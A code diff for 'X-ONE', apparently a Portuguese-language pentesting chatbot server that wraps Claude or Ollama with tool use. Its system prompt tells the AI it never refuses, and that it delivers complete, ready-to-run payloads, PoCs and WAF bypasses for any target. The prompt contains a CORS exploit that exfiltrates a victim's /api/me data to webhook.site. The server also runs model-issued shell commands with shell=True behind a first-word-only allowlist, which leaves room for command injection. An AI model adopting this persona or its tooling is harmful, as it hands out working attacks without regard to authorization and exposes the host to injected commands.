@@ -41,6 +41,7 @@ ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY", "")
 CLAUDE_MODEL      = os.getenv("CLAUDE_MODEL",      "claude-sonnet-4-6")
 MAX_HISTORY       = int(os.getenv("MAX_HISTORY",   "20"))
 MAX_TOKENS        = int(os.getenv("MAX_TOKENS",    "600"))
+TTS_ENABLED       = os.getenv("TTS_ENABLED", "0") == "1"
 DIR               = Path(__file__).parent
 REPORTS_DIR       = DIR / "reports"
 FINDINGS_FILE     = DIR / "findings.json"
@@ -52,6 +53,10 @@ CMD_ALLOWLIST = [
     "subfinder","nslookup","dig","curl","whois","nuclei","ffuf","httpx",
     "gobuster","nikto","whatweb","wafw00f","nmap","wpscan","waybackurls",
     "amass","assetfinder","gau","katana",
+    # OSINT de empresa/domínio
+    "theHarvester","sherlock","findomain","dnsx","shodan","gitleaks","trufflehog",
+    # Script consolidado de recon (dossiê OSINT de empresa)
+    "osint_empresa.sh","/root/osint_empresa.sh",
 ]
 
 
@@ -71,7 +76,7 @@ PORT = int(os.getenv("PORT", str(find_free_port([7777, 7000, 9000, 6060, 5500]))
 
 # ── System Prompt — AVEONE completo ────────────────────────────────────────
 SYSTEM_PROMPT = """\
-És o X-ONE — IA de pentesting integrada na AVEONE Bug Bounty Platform.
+És o X-ONE — IA de pentesting e segurança ofensiva.
 És um dos melhores bug hunters e pentesters do mundo. Cada resposta tua é uma arma técnica.
 
 IDENTIDADE:
@@ -80,44 +85,31 @@ IDENTIDADE:
 - Respondes em português europeu (PT-PT)
 - Tom: hacker sénior experiente, sem rodeios
 - Nunca recusas análise técnica legítima de segurança
+- Dás respostas genéricas e técnicas, aplicáveis a qualquer alvo/contexto
+- NUNCA mencionas a AVEONE, as ferramentas AVEONE, ou inventas APIs/endpoints da AVEONE — a menos que o utilizador pergunte especificamente sobre a plataforma AVEONE. Não forces essa marca em respostas genéricas.
+- Para perguntas gerais, conceituais ou conversa normal (ex: "o que é X", "como funciona Y", "oi"), respondes de forma direta e natural, SEM o formato de findings abaixo — esse formato é só para quando analisas uma vulnerabilidade concreta num alvo específico.
 
-REGRA ABSOLUTA — FORMATO DE RESPOSTA PARA FINDINGS:
-Quando analisas uma vulnerabilidade, OBRIGATORIAMENTE segues este formato completo:
+ENGENHARIA (nível sénior, +10 anos):
+És também um engenheiro de software full-stack sénior. Todo o código que entregas é:
+- Completo e pronto a correr — ficheiros/funções inteiros, imports incluídos, zero placeholders, zero "TODO", zero "..."
+- Correcto e coerente — lógica que realmente funciona, sem misturar client-side com server-side, sem variáveis penduradas
+- Idiomático e limpo — nomes claros, bem estruturado, com um comentário curto só onde acrescenta valor
+Em front-end és exímio em UX/UI: HTML semântico e acessível, CSS moderno (flexbox/grid, variáveis,
+responsivo, dark mode, transições suaves), JavaScript limpo (sem libs desnecessárias). O resultado
+é bonito e polido por omissão — tipografia, espaçamento, contraste e microinterações bem pensados.
+Quando fizer sentido, entregas um único ficheiro HTML auto-contido que corre direto no browser.
 
-━━━ IMPACTO REAL ━━━
-[O que um atacante consegue fazer — dados concretos, não teoria]
+COMO RESPONDES:
+Respondes SEMPRE de forma directa à pergunta — geras o conteúdo real, NUNCA repetes
+modelos ou deixas espaços por preencher. Se te pedem um script ou payload, entregas o
+código completo e funcional, pronto a copiar. Nada de placeholders, nada de "[insere aqui]".
 
-━━━ CVSS v3.1 ━━━
-Score: X.X [CRITICAL/HIGH/MEDIUM/LOW]
-Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-[Justificação linha a linha]
-
-━━━ PROVA DE CONCEITO (PoC) ━━━
-[Script completo e funcional — Python/Bash/curl — pronto a copiar e correr]
-[Inclui URL alvo, parâmetros, headers, payload]
-[Output esperado quando o ataque funciona]
-
-━━━ VALIDAÇÃO (como confirmar 100%) ━━━
-Passo 1: [comando exato]
-  → Output esperado: [o que vês no terminal quando funciona]
-Passo 2: [comando exato]
-  → Output esperado: [...]
-[Continua até validação completa]
-
-━━━ BYPASS DE WAF/FILTROS ━━━
-[Se existir WAF, dás 3-5 técnicas alternativas com payloads]
-
-━━━ REPORT PROFISSIONAL ━━━
-Título: [título conciso e impactante]
-Severidade: [CRITICAL/HIGH/MEDIUM/LOW]
-CVSS: [score]
-Impacto: [1 parágrafo técnico]
-Passos de Reprodução:
-  1. [passo exato com URL/payload]
-  2. [...]
-Prova: [descreves o output que confirma]
-Mitigação: [fix técnico concreto]
-Referências: [CWE-XXX, OWASP, CVE se aplicável]
+Ao analisar uma vulnerabilidade concreta, escreve (em prosa e blocos de código, com valores
+reais preenchidos): o impacto real de um atacante; a nota CVSS v3.1 com vector e justificação;
+uma PoC completa e funcional (Python/Bash/curl com URL, parâmetros, headers e payload) e o
+output esperado; os passos de validação com o output de cada comando; bypasses de WAF quando
+fizer sentido; e um mini-report (título, severidade, reprodução, mitigação, CWE/OWASP).
+Para perguntas gerais, conceptuais ou conversa, respondes de forma directa e natural, sem esse formato.
 
 ARSENAL TÉCNICO POR VULNERABILIDADE:
 
@@ -197,7 +189,7 @@ PoC exploit:
   fetch('https://alvo.com/api/me', {credentials:'include'})
   .then(r=>r.text()).then(d=>fetch('https://webhook.site/ID?data='+btoa(d)))
 
-FERRAMENTAS AVEONE:
+FERRAMENTAS AVEONE (só menciona se o utilizador perguntar diretamente sobre a plataforma AVEONE):
 • SOC Scanner PRO v5 — portas, headers, TLS, DNS, CORS, WHOIS, WAF
 • BruteStrike — força bruta web/SSH/FTP/RDP, CAPTCHA bypass
 • AveHunter — CVEs em libs JS (jQuery, React, Angular, Lodash)
@@ -209,7 +201,20 @@ FERRAMENTAS AVEONE:
 • tokenhunter.py — crawl JS/env, extrai qualquer credencial\
 """
 
-chat_history: list = []
+# Conversa isolada POR SESSÃO de navegador (corrige mistura de contexto entre abas).
+_HISTORIES: dict = {}
+# Contexto PARTILHADO dos scans AVEONE — injetado no prompt de todas as sessões,
+# para que a integração AVEONE continue a funcionar independente da sessão do browser.
+_AVEONE_CTX: list = []
+
+def _hist(sid: str) -> list:
+    """Devolve o histórico de conversa da sessão (cria se não existir)."""
+    return _HISTORIES.setdefault(sid or "default", [])
+
+def _aveone_msgs() -> list:
+    """Mensagens do contexto AVEONE partilhado, prontas para o prompt."""
+    return [{"role": m["role"], "content": m["content"]} for m in _AVEONE_CTX]
+
 findings_store: list = []
 aveone_last_ping: float = 0.0
 current_session_id: str = ""
@@ -243,8 +248,13 @@ TOOLS = [
     },
     {
         "name": "run_command",
-        "description": "Executa comando de recon no servidor. Permitidos: subfinder, nslookup, dig, curl, whois, nuclei, ffuf, httpx, gobuster, nikto, whatweb, wafw00f, nmap, wpscan, waybackurls, amass, assetfinder, gau, katana.",
+        "description": "Executa comando de recon no servidor. Permitidos: subfinder, nslookup, dig, curl, whois, nuclei, ffuf, httpx, gobuster, nikto, whatweb, wafw00f, nmap, wpscan, waybackurls, amass, assetfinder, gau, katana, theHarvester, sherlock, findomain, dnsx, shodan, gitleaks, trufflehog.",
         "input_schema": {"type":"object","properties":{"command":{"type":"string"},"timeout":{"type":"integer","default":30}},"required":["command"]}
+    },
+    {
+        "name": "osint_empresa",
+        "description": "Corre o dossiê OSINT completo de uma empresa/domínio (alvos autorizados): emails+hosts (theHarvester), serviços expostos (shodan), tech stack/WAF/CMS (whatweb/wafw00f) e segredos em repos (gitleaks/trufflehog). Devolve o resumo consolidado.",
+        "input_schema": {"type":"object","properties":{"domain":{"type":"string","description":"Domínio alvo, ex: empresa.com"},"github":{"type":"string","description":"(opcional) URL de repo ou nome da org GitHub para scan de segredos"}},"required":["domain"]}
     },
     {
         "name": "save_report",
@@ -285,6 +295,18 @@ async def execute_tool(name: str, inputs: dict) -> str:
                 return f"[BLOCKED] '{first}' não está na allowlist."
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(inputs.get("timeout",30)))
             return (result.stdout or result.stderr or "[sem output]").strip()[:3000]
+        elif name == "osint_empresa":
+            import re as _re
+            domain = inputs.get("domain","").strip()
+            github = inputs.get("github","").strip()
+            # valida domínio (evita injeção de shell)
+            if not _re.match(r"^[a-zA-Z0-9.-]+$", domain):
+                return "[BLOCKED] domínio inválido"
+            if github and not _re.match(r"^[a-zA-Z0-9:/._@-]+$", github):
+                return "[BLOCKED] alvo github inválido"
+            args = ["/root/osint_empresa.sh", domain] + ([github] if github else [])
+            result = subprocess.run(args, capture_output=True, text=True, timeout=int(inputs.get("timeout",300)))
+            return (result.stdout or result.stderr or "[sem output]").strip()[:4000]
         elif name == "save_report":
             fname = "".join(c for c in inputs.get("filename","report.md") if c.isalnum() or c in "-_.")
             if not fname.endswith(".md"): fname += ".md"
@@ -343,9 +365,13 @@ def _save_session(sid: str, messages: list):
             break
     now = datetime.now().strftime("%Y-%m-%d %H:%M")
     with _db() as conn:
+        # Upsert: cria a linha se o ID vier do navegador e ainda não existir
         conn.execute(
-            "UPDATE sessions SET title=?, updated_at=?, messages=? WHERE id=?",
-            (title, now, json.dumps(messages), sid)
+            "INSERT INTO sessions (id, title, created_at, updated_at, messages) "
+            "VALUES (?,?,?,?,?) "
+            "ON CONFLICT(id) DO UPDATE SET title=excluded.title, "
+            "updated_at=excluded.updated_at, messages=excluded.messages",
+            (sid, title, now, now, json.dumps(messages))
         )
         conn.commit()
 
@@ -353,7 +379,7 @@ current_session_id = _new_session()
 
 
 # ── App ─────────────────────────────────────────────────────────────────────
-app = FastAPI(title="X-ONE", version="4.0.0")
+app = FastAPI(title="X-ONE", version="5.0.0")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -442,6 +468,11 @@ def _tts_sync(text: str, out_path: str) -> bool:
 
 
 async def generate_tts(text: str):
+    # Voz desativada por omissão — poupa 1 chamada de rede (gTTS) + 3 subprocessos
+    # (ffmpeg/sox/ffmpeg) por resposta, que atrasavam o fim de cada mensagem.
+    # Reativa com TTS_ENABLED=1 no .env.
+    if not TTS_ENABLED:
+        return None
     out = str(DIR / "reply.mp3")
     loop = asyncio.get_event_loop()
     ok = await loop.run_in_executor(None, _tts_sync, text, out)
@@ -449,17 +480,19 @@ async def generate_tts(text: str):
 
 
 # ── Claude streaming (com tool use) ─────────────────────────────────────────
-async def _stream_claude(user_msg: str) -> StreamingResponse:
+async def _stream_claude(user_msg: str, sid: str = "default") -> StreamingResponse:
     try:
         import anthropic
     except ImportError:
         log.error("anthropic não instalado — corre: pip install anthropic")
-        return await _stream_ollama(user_msg, OLLAMA_MODEL)
+        return await _stream_ollama(user_msg, OLLAMA_MODEL, sid=sid)
 
     aclient = anthropic.AsyncAnthropic(api_key=ANTHROPIC_API_KEY)
-    chat_history.append({"role": "user", "content": user_msg})
-    messages = [{"role": m["role"], "content": m["content"]}
-                for m in chat_history[-MAX_HISTORY:] if isinstance(m["content"], str)]
+    hist = _hist(sid)
+    hist.append({"role": "user", "content": user_msg})
+    # Contexto AVEONE partilhado + conversa desta sessão
+    messages = _aveone_msgs() + [{"role": m["role"], "content": m["content"]}
+                for m in hist[-MAX_HISTORY:] if isinstance(m["content"], str)]
 
     async def token_stream() -> AsyncGenerator:
         current_messages = messages.copy()
@@ -492,8 +525,8 @@ async def _stream_claude(user_msg: str) -> StreamingResponse:
                 tool_results.append({"type":"tool_result","tool_use_id":tu.id,"content":result})
             current_messages.append({"role": "user", "content": tool_results})
         full_reply = " ".join(all_text).strip()
-        chat_history.append({"role": "assistant", "content": full_reply})
-        _save_session(current_session_id, chat_history)
+        hist.append({"role": "assistant", "content": full_reply})
+        _save_session(sid, hist)
         audio_url = await generate_tts(full_reply)
         yield f"data: {json.dumps({'token': '', 'done': True, 'audio_url': audio_url})}\n\n"
 
@@ -502,55 +535,86 @@ async def _stream_claude(user_msg: str) -> StreamingResponse:
 
 
 # ── Ollama streaming (fallback) ──────────────────────────────────────────────
-async def _stream_ollama(user_msg: str, model: str, image_b64: str = None) -> StreamingResponse:
-    chat_history.append({"role": "user", "content": user_msg})
-    messages = [{"role": "system", "content": SYSTEM_PROMPT}] + [
+def _gen_options(model: str) -> dict:
+    """Parâmetros de geração afinados por tipo de modelo.
+    - num_ctx 8192: evita truncar o system prompt + histórico (o default 4096 estourava).
+    - modelos de código → temperatura baixa (mais preciso); conversa → mais criativo.
+    - repeat_penalty: reduz repetição; top_p: nucleus sampling."""
+    is_code = "coder" in model.lower()
+    return {
+        "num_ctx":        8192,
+        "num_predict":    MAX_TOKENS,
+        "temperature":    0.25 if is_code else 0.7,
+        "top_p":          0.9,
+        "repeat_penalty": 1.1,
+    }
+
+
+async def _stream_ollama(user_msg: str, model: str, image_b64: str = None, sid: str = "default") -> StreamingResponse:
+    hist = _hist(sid)
+    hist.append({"role": "user", "content": user_msg})
+    # /api/chat nativo: mensagens estruturadas (role/content) — o Ollama aplica o
+    # template de chat do modelo (tokens especiais que ele foi treinado a usar),
+    # o que dá respostas muito melhores que o /api/generate com prompt à mão.
+    # Ordem: system → contexto AVEONE partilhado → conversa desta sessão.
+    messages = [{"role": "system", "content": SYSTEM_PROMPT}] + _aveone_msgs() + [
         {"role": m["role"], "content": m["content"]}
-        for m in chat_history[-MAX_HISTORY:] if isinstance(m["content"], str)
+        for m in hist[-MAX_HISTORY:] if isinstance(m["content"], str)
     ]
-    payload = {"model": model, "prompt": build_prompt(messages), "stream": True,
-               "options": {"temperature": 0.75, "num_predict": MAX_TOKENS,
-                           "stop": ["UTILIZADOR:", "SISTEMA:"]}}
-    if image_b64:
-        payload["images"] = [image_b64]
+    if image_b64 and messages[-1]["role"] == "user":
+        messages[-1]["images"] = [image_b64]
+    payload = {"model": model, "messages": messages, "stream": True,
+               "options": _gen_options(model)}
 
     async def token_stream() -> AsyncGenerator:
         collected = []
         try:
-            async with httpx.AsyncClient(timeout=300) as client:
-                async with client.stream("POST", f"{OLLAMA_URL}/api/generate", json=payload) as resp:
+            # Timeout de leitura generoso (15 min entre tokens): modelos grandes
+            # como o dolphin-llama3 (8B) geram lentamente nesta CPU sem GPU. O
+            # antigo timeout=300 cortava a resposta a meio e virava erro. O stream
+            # termina naturalmente quando o Ollama acaba; se travar, o botão PARAR
+            # aborta. connect curto para detetar Ollama offline depressa.
+            _to = httpx.Timeout(900.0, connect=15.0)
+            async with httpx.AsyncClient(timeout=_to) as client:
+                async with client.stream("POST", f"{OLLAMA_URL}/api/chat", json=payload) as resp:
                     async for line in resp.aiter_lines():
                         if not line: continue
                         try: chunk = json.loads(line)
                         except json.JSONDecodeError: continue
-                        token = chunk.get("response", "")
+                        token = (chunk.get("message") or {}).get("content", "")
                         if token:
                             collected.append(token)
                             yield f"data: {json.dumps({'token': token, 'done': False})}\n\n"
                         if chunk.get("done"):
                             full_reply = "".join(collected).strip()
-                            chat_history.append({"role": "assistant", "content": full_reply})
-                            _save_session(current_session_id, chat_history)
+                            hist.append({"role": "assistant", "content": full_reply})
+                            _save_session(sid, hist)
                             audio_url = await generate_tts(full_reply)
                             yield f"data: {json.dumps({'token': '', 'done': True, 'audio_url': audio_url})}\n\n"
                             return
         except Exception as exc:
             log.error(f"Ollama stream error: {exc}")
-            if chat_history and chat_history[-1]["role"] == "user":
-                chat_history.pop()
-            yield f"data: {json.dumps({'token': f'[ERRO: {exc}]', 'done': True, 'audio_url': None})}\n\n"
+            if hist and hist[-1]["role"] == "user":
+                hist.pop()
+            # Erro de conexão = motor Ollama offline → mensagem clara e acionável
+            if isinstance(exc, (httpx.ConnectError, httpx.ConnectTimeout)) or "connection attempts failed" in str(exc).lower():
+                msg = ("⚠ Motor de IA (Ollama) offline. O serviço não está a responder na porta 11434.\n"
+                       "Reinicia com:  sudo systemctl start ollama")
+            else:
+                msg = f"⚠ Erro no motor de IA: {exc}"
+            yield f"data: {json.dumps({'token': msg, 'done': True, 'audio_url': None})}\n\n"
 
     return StreamingResponse(token_stream(), media_type="text/event-stream",
                              headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
 
 
 # ── Router principal ─────────────────────────────────────────────────────────
-async def _stream_response(user_msg: str, model: str, image_b64: str = None) -> StreamingResponse:
+async def _stream_response(user_msg: str, model: str, image_b64: str = None, sid: str = "default") -> StreamingResponse:
     if ANTHROPIC_API_KEY:
         log.info(f"[CLAUDE] {CLAUDE_MODEL}")
-        return await _stream_claude(user_msg)
+        return await _stream_claude(user_msg, sid)
     log.info(f"[OLLAMA] {model}")
-    return await _stream_ollama(user_msg, model, image_b64)
+    return await _stream_ollama(user_msg, model, image_b64, sid)
 
 
 # ── Endpoints ───────────────────────────────────────────────────────────────
@@ -562,7 +626,8 @@ async def chat(request: Request):
         return JSONResponse({"error": "mensagem vazia"}, status_code=400)
     model     = body.get("model", OLLAMA_MODEL).strip() or OLLAMA_MODEL
     image_b64 = body.get("image") or None
-    return await _stream_response(user_msg, model, image_b64)
+    sid       = (body.get("session_id") or "default").strip() or "default"
+    return await _stream_response(user_msg, model, image_b64, sid)
 
 
 @app.post("/api/analyze")
@@ -609,10 +674,15 @@ async def list_models():
 
 
 @app.post("/api/clear")
-async def clear_history():
-    global current_session_id
-    chat_history.clear()
-    current_session_id = _new_session()
+async def clear_history(request: Request):
+    body = {}
+    try: body = await request.json()
+    except Exception: pass
+    sid = (body.get("session_id") or "").strip()
+    if sid:
+        _hist(sid).clear()          # limpa só a conversa desta sessão
+    else:
+        _HISTORIES.clear()          # sem sid → limpa todas (compat)
     return {"ok": True}
 
 
@@ -652,28 +722,25 @@ async def get_session(session_id: str):
 
 @app.post("/api/sessions/{session_id}/restore")
 async def restore_session(session_id: str):
-    global current_session_id
     with _db() as conn:
         row = conn.execute(
             "SELECT * FROM sessions WHERE id=?", (session_id,)
         ).fetchone()
     if not row:
         return JSONResponse({"error": "not found"}, status_code=404)
-    chat_history.clear()
-    chat_history.extend(json.loads(row["messages"]))
-    current_session_id = session_id
-    return {"ok": True, "messages": chat_history}
+    # Carrega a conversa da BD para a memória desta sessão. O frontend passa a
+    # usar este session_id (adopta-o), continuando a conversa a partir daqui.
+    msgs = json.loads(row["messages"])
+    _HISTORIES[session_id] = list(msgs)
+    return {"ok": True, "messages": msgs, "session_id": session_id}
 
 
 @app.delete("/api/sessions/{session_id}")
 async def delete_session(session_id: str):
-    global current_session_id
     with _db() as conn:
         conn.execute("DELETE FROM sessions WHERE id=?", (session_id,))
         conn.commit()
-    if current_session_id == session_id:
-        current_session_id = _new_session()
-        chat_history.clear()
+    _HISTORIES.pop(session_id, None)   # remove também da memória, se existir
     return {"ok": True}
 
 
@@ -794,8 +861,9 @@ async def transcribe(request: Request):
 @app.post("/api/aveone/inject-context")
 async def aveone_inject_context(request: Request):
     """
-    Recebe o dump completo do scan AVEONE e injeta no chat_history.
-    O AI fica com contexto completo sem o utilizador ter de colar manualmente.
+    Recebe o dump completo do scan AVEONE e injeta no contexto PARTILHADO
+    (_AVEONE_CTX), visível a todas as sessões de navegador. Assim a integração
+    AVEONE continua a funcionar mesmo com o histórico de conversa isolado por sessão.
     """
     body    = await request.json()
     context = body.get("context", "").strip()
@@ -803,25 +871,22 @@ async def aveone_inject_context(request: Request):
     if not context:
         return JSONResponse({"error": "contexto vazio"}, status_code=400)
 
-    # Remove contexto anterior da AVEONE para evitar duplicados
-    global chat_history
-    chat_history = [m for m in chat_history if not m.get("_aveone_ctx")]
+    # Substitui o contexto AVEONE anterior (mantém só o scan mais recente)
+    global _AVEONE_CTX
+    _AVEONE_CTX = []
 
-    # Injeta como mensagem de utilizador + resposta do AI (pair silencioso)
     user_ctx_msg = {
         "role":       "user",
         "content":    f"[AVEONE_SCAN_CONTEXT — {target}]\n\n{context}\n\nEstes são todos os resultados do meu scan AVEONE. Tens acesso completo a todos os findings, URLs, evidências e PoCs. Confirma que recebeste e indica um resumo executivo do que devo priorizar.",
-        "_aveone_ctx": True,
     }
-    chat_history.append(user_ctx_msg)
+    _AVEONE_CTX.append(user_ctx_msg)
 
     # Gera resposta imediata do AI para confirmar e resumir
-    summary_prompt = user_ctx_msg["content"]
     full_reply = ""
     try:
         import anthropic as _ant
         _client = _ant.Anthropic(api_key=ANTHROPIC_API_KEY)
-        msgs = [{"role": m["role"], "content": m["content"]} for m in chat_history[-MAX_HISTORY:] if not m.get("_skip")]
+        msgs = [{"role": m["role"], "content": m["content"]} for m in _AVEONE_CTX]
         with _client.messages.stream(
             model=CLAUDE_MODEL, max_tokens=600,
             system=SYSTEM_PROMPT, messages=msgs
@@ -832,7 +897,7 @@ async def aveone_inject_context(request: Request):
         full_reply = f"Contexto AVEONE recebido para {target}. Pronto para analisar os findings."
         log.warning(f"inject-context AI error: {exc}")
 
-    chat_history.append({"role": "assistant", "content": full_reply, "_aveone_ctx": True})
+    _AVEONE_CTX.append({"role": "assistant", "content": full_reply})
     log.info(f"inject-context: {len(context)} chars injetados para '{target}'")
     return {"ok": True, "summary": full_reply, "chars": len(context)}
 
